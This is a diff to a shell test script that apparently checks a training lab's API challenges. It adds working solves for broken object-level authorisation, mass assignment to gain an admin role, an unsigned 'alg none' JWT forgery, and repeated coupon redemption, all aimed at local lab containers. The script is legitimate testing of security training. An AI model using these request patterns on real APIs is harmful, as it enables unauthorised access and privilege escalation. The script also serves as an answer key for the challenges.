@@ -85,5 +85,39 @@ if [ -n "${S:-}" ]; then
   submit fetch-secret "$S" "$F" | grep -q '"correct":true' && ok "SSRF pivot → flag accepted" || bad "ssrf solve" "$F"
   destroy "$S"
 fi
+
+L=$(launch api-bola-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "bola launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"alice"}' | J "d['token']")
+  F=$(curl -s "http://127.0.0.1:$P/api/v1/invoices/INV-2" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
+  submit bola-read "$S" "$F" | grep -q '"correct":true' && ok "BOLA read → flag accepted" || bad "bola solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch api-mass-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "mass launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"user","password":"user"}' | J "d['token']")
+  curl -s -X PATCH "http://127.0.0.1:$P/api/v1/profile" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"nickname":"x","role":"admin"}' > /dev/null
+  F=$(curl -s "http://127.0.0.1:$P/admin/flag" -H "Authorization: Bearer $TOK" | J "d.get('flag','')")
+  submit mass-assign "$S" "$F" | grep -q '"correct":true' && ok "mass assign → flag accepted" || bad "mass solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch api-jwt-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "jwt launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  NONE=$(python3 -c "import base64,json;e=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip('=');print(e({'alg':'none','typ':'JWT'})+'.'+e({'sub':'user','role':'admin'})+'.')")
+  F=$(curl -s "http://127.0.0.1:$P/admin/flag" -H "Authorization: Bearer $NONE" | J "d.get('flag','')")
+  submit jwt-none "$S" "$F" | grep -q '"correct":true' && ok "JWT none → flag accepted" || bad "jwt solve" "$F"
+  destroy "$S"
+fi
+
+L=$(launch api-ratelimit-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "ratelimit launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"user","password":"user"}' | J "d['token']")
+  F=""
+  for _ in 1 2 3 4 5; do F=$(curl -s -X POST "http://127.0.0.1:$P/api/v1/coupons/redeem" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"code":"WELCOME10"}' | J "d.get('flag','')"); done
+  submit abuse-redeem "$S" "$F" | grep -q '"correct":true' && ok "coupon abuse → flag accepted" || bad "ratelimit solve" "$F"
+  destroy "$S"
+fi
 echo "== $PASS passed, $FAIL failed =="
 [ "$FAIL" = "0" ]
